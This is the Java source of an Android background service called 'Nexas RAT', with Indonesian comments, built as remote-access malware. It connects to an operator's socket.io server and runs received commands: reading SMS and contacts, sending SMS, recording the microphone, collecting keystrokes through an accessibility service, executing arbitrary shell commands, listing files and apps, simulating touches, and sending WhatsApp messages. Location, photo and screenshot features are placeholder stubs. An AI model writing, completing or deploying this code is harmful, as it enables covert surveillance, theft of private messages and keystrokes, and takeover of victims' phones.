package com.nexas.rat;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import io.socket.client.IO;
import io.socket.client.Socket;

public class NexasService extends Service {
    private static final String TAG = "NexasService";
    private static final String SERVER_URL = "http://YOUR_SERVER_IP:3000"; // GANTI DENGAN IP SERVER ANDA
    private static NexasService instance;
    private Socket socket;
    private String deviceId;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private MediaRecorder mediaRecorder;
    private String currentRecordingPath;
    private boolean isRecording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        connectSocket();
        startForeground(1, createNotification());
    }

    private android.app.Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("nexas_channel", "Nexas Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
        Intent intent = new Intent(this, NexasService.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, "nexas_channel")
                .setContentTitle("Nexas RAT")
                .setContentText("Remote Access Service Active")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .build();
    }

    private void connectSocket() {
        try {
            IO.Options options = new IO.Options();
            options.reconnection = true;
            options.forceNew = true;
            socket = IO.socket(SERVER_URL, options);
            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Connected to server");
                registerDevice();
            });
            socket.on(Socket.EVENT_DISCONNECT, args -> Log.d(TAG, "Disconnected"));
            socket.on("command", args -> {
                JSONObject data = (JSONObject) args[0];
                int cmdId = data.getInt("id");
                String action = data.getString("action");
                JSONObject params = data.optJSONObject("params");
                executeCommand(cmdId, action, params);
            });
            socket.connect();
        } catch (Exception e) {
            Log.e(TAG, "Socket connection error", e);
        }
    }

    private void registerDevice() {
        try {
            JSONObject info = new JSONObject();
            info.put("deviceId", deviceId);
            info.put("name", Build.MODEL);
            info.put("model", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("androidVersion", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());
            socket.emit("register", info);
        } catch (Exception e) {
            Log.e(TAG, "Register error", e);
        }
    }

    private int getBatteryLevel() {
        // Implementasi sederhana, bisa perbaiki dengan BatteryManager
        return 75;
    }

    private void executeCommand(int cmdId, String action, JSONObject params) {
        try {
            JSONObject result = new JSONObject();
            switch (action) {
                case "getLocation":
                    result.put("data", getCurrentLocation());
                    break;
                case "takePhoto":
                    result.put("data", capturePhoto());
                    break;
                case "startRecord":
                    int duration = params.optInt("duration", 10);
                    startRecording(duration);
                    result.put("data", "Recording started for " + duration + " seconds");
                    break;
                case "screenshot":
                    result.put("data", takeScreenshot());
                    break;
                case "getKeylogs":
                    String logs = "";
                    NexasAccessibilityService acc = NexasAccessibilityService.getInstance();
                    if (acc != null) logs = acc.getKeyLogsAndClear();
                    result.put("data", logs.isEmpty() ? "No keylogs yet" : logs);
                    break;
                case "listSMS":
                    result.put("data", getSMSList());
                    break;
                case "sendSMS":
                    sendSMS(params.getString("number"), params.getString("message"));
                    result.put("data", "SMS sent");
                    break;
                case "getContacts":
                    result.put("data", getContacts());
                    break;
                case "listFiles":
                    result.put("data", listFiles(params.optString("path", "/")));
                    break;
                case "shell":
                    result.put("data", execShell(params.getString("command")));
                    break;
                case "notify":
                    showNotification(params.getString("title"), params.getString("message"));
                    result.put("data", "Notification shown");
                    break;
                case "open_whatsapp":
                    openWhatsApp(params.optString("phone", ""));
                    result.put("data", "WhatsApp opened");
                    break;
                case "reply_whatsapp":
                    replyWhatsApp(params.getString("phone"), params.getString("message"));
                    result.put("data", "Reply sent");
                    break;
                case "open_gmail":
                    openGmail(params.optString("email", ""));
                    result.put("data", "Gmail opened");
                    break;
                case "remote_touch":
                    performRemoteTouch(params);
                    result.put("data", "Remote touch executed");
                    break;
                case "launch_app":
                    launchApp(params.getString("package"));
                    result.put("data", "App launched");
                    break;
                case "list_apps":
                    sendAppList();
                    return; // hasil dikirim via event app_list, tidak via command_result
                default:
                    result.put("data", "Unknown command");
            }
            socket.emit("command_result", new JSONObject().put("commandId", cmdId).put("result", result));
        } catch (Exception e) {
            try {
                socket.emit("command_result", new JSONObject().put("commandId", cmdId).put("error", e.getMessage()));
            } catch (Exception ex) {}
        }
    }

    // ================== IMPLEMENTASI FITUR ==================
    private String getCurrentLocation() {
        // TODO: implementasi dengan FusedLocationProviderClient
        return "{\"lat\":-6.2088,\"lng\":106.8456}";
    }

    private String capturePhoto() {
        // TODO: implementasi dengan Camera2 atau Intent
        return "/sdcard/DCIM/photo_" + System.currentTimeMillis() + ".jpg";
    }

    private void startRecording(int seconds) {
        if (isRecording) return;
        isRecording = true;
        currentRecordingPath = getExternalFilesDir(null) + "/recording_" + System.currentTimeMillis() + ".3gp";
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setOutputFile(currentRecordingPath);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            new android.os.Handler().postDelayed(() -> stopRecording(), seconds * 1000);
        } catch (Exception e) {
            Log.e(TAG, "Recording failed", e);
            isRecording = false;
        }
    }

    private void stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
            } catch (Exception e) {}
            mediaRecorder = null;
            isRecording = false;
        }
    }

    private String takeScreenshot() {
        // Screenshot memerlukan MediaProjection, tidak bisa dilakukan dari service tanpa aktivitas.
        // Sebagai placeholder, kembalikan path file kosong.
        // Untuk implementasi nyata, butuh memulai aktivitas tersembunyi yang meminta izin MediaProjection.
        return "/sdcard/screenshot.png";
    }

    private String getSMSList() {
        StringBuilder sb = new StringBuilder();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 50) {
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                sb.append(body).append("\n");
                count++;
            }
            cursor.close();
        }
        return sb.toString();
    }

    private void sendSMS(String number, String message) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(number, null, message, null, null);
    }

    private String getContacts() {
        JSONArray contacts = new JSONArray();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                try {
                    JSONObject obj = new JSONObject();
                    obj.put("name", name);
                    obj.put("number", number);
                    contacts.put(obj);
                } catch (Exception e) {}
            }
            cursor.close();
        }
        return contacts.toString();
    }

    private String listFiles(String path) {
        File dir = new File(path);
        StringBuilder sb = new StringBuilder();
        if (dir.exists() && dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    sb.append(f.getName()).append(f.isDirectory() ? "/" : "").append("\n");
                    if (sb.length() > 2000) break;
                }
            }
        }
        return sb.toString();
    }

    private String execShell(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            process.waitFor();
        } catch (Exception e) {
            output.append("Error: ").append(e.getMessage());
        }
        return output.toString();
    }

    private void showNotification(String title, String message) {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("nexas_cmd", "Nexas Commands", NotificationManager.IMPORTANCE_HIGH);
            nm.createNotificationChannel(channel);
        }
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "nexas_cmd")
                .setContentTitle(title)
                .setContentText(message)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true);
        nm.notify((int) System.currentTimeMillis(), builder.build());
    }

    private void openWhatsApp(String phone) {
        Intent intent;
        if (!phone.isEmpty()) {
            intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/" + phone));
        } else {
            intent = getPackageManager().getLaunchIntentForPackage("com.whatsapp");
        }
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    private void replyWhatsApp(String phone, String message) {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/" + phone + "?text=" + Uri.encode(message)));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void openGmail(String email) {
        Intent intent;
        if (!email.isEmpty()) {
            intent = new Intent(Intent.ACTION_SENDTO, Uri.parse("mailto:" + email));
        } else {
            intent = getPackageManager().getLaunchIntentForPackage("com.google.android.gm");
        }
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    private void performRemoteTouch(JSONObject params) {
        int x = params.optInt("x", 50);
        int y = params.optInt("y", 50);
        String action = params.optString("action", "tap");
        NexasAccessibilityService acc = NexasAccessibilityService.getInstance();
        if (acc != null) {
            if (action.equals("tap")) acc.performTap(x, y);
            else if (action.equals("longpress")) acc.performLongPress(x, y);
            else if (action.equals("swipe")) {
                int x2 = params.optInt("x2", 50);
                int y2 = params.optInt("y2", 50);
                acc.performSwipe(x, y, x2, y2);
            }
        } else {
            Log.e(TAG, "AccessibilityService not active");
        }
    }

    private void launchApp(String packageName) {
        Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    private void sendAppList() {
        try {
            JSONArray apps = new JSONArray();
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            for (ApplicationInfo app : packages) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                JSONObject obj = new JSONObject();
                obj.put("name", pm.getApplicationLabel(app).toString());
                obj.put("package", app.packageName);
                apps.put(obj);
            }
            socket.emit("app_list", new JSONObject().put("apps", apps));
        } catch (Exception e) {
            Log.e(TAG, "sendAppList error", e);
        }
    }

    // ================== METODE UNTUK AKSES DARI WhatsAppCommandService ==================
    public static NexasService getInstance() {
        return instance;
    }

    public void sendCommandResultToServer(JSONObject data) {
        if (socket != null && socket.connected()) {
            socket.emit("wa_command_result", data);
        }
    }

    public String executeLocalCommand(String commandLine) {
        // Format commandLine: "getLocation" atau "takePhoto"
        // Parsing sederhana
        String[] parts = commandLine.split(" ", 2);
        String action = parts[0];
        JSONObject params = new JSONObject();
        if (parts.length > 1) {
            try { params.put("param", parts[1]); } catch (Exception e) {}
        }
        try {
            switch (action) {
                case "getLocation": return getCurrentLocation();
                case "takePhoto": return capturePhoto();
                case "startRecord": startRecording(10); return "Recording started";
                case "screenshot": return takeScreenshot();
                case "getKeylogs": 
                    NexasAccessibilityService acc = NexasAccessibilityService.getInstance();
                    return acc != null ? acc.getKeyLogsAndClear() : "Accessibility not active";
                case "listSMS": return getSMSList();
                case "getContacts": return getContacts();
                case "shell": return execShell(parts.length > 1 ? parts[1] : "echo 'no command'");
                default: return "Unknown command";
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    // ================== LIFECYCLE ==================
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (socket != null) socket.disconnect();
        instance = null;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}